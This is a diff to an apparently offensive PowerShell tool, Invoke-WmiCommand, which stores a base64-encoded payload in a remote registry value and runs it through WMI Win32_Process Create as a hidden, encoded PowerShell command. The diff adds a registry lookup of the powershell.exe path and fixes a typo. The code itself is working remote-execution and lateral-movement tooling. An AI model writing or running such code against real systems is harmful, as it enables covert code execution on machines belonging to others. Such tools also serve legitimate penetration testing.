@@ -209,6 +209,8 @@ the output of your payload back. :P
             'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
         }
 
+        $HKEY_LOCAL_MACHINE = 2147483650
+
         $WmiMethodArgs = @{}
 
         # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
@@ -253,6 +255,18 @@ the output of your payload back. :P
                 throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
             }
 
+            $PSSettingsPath = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
+            $PSPathValueName = 'Path'
+
+            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName
+
+            if ($Result.ReturnValue -ne 0) {
+                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$PSSettingsPath\$PSPathValueName"
+            }
+
+            $PowerShellPath = $Result.sValue
+            Write-Verbose "Full PowerShell path: $PowerShellPath"
+
             $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
 
             Write-Verbose "[$Computer] Storing the payload into the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
@@ -293,7 +307,7 @@ the output of your payload back. :P
 
             $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))
 
-            $Cmdline = "powershell -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"
+            $Cmdline = "$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"
 
             # Execute the payload runner on the remote system
             $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline
@@ -301,7 +315,7 @@ the output of your payload back. :P
             Start-Sleep -Seconds 5
 
             if ($Result.ReturnValue -ne 0) {
-                throw "[$Computer] Unable execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
+                throw "[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
             }
 
             Write-Verbose "[$Computer] Payload successfully executed from: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
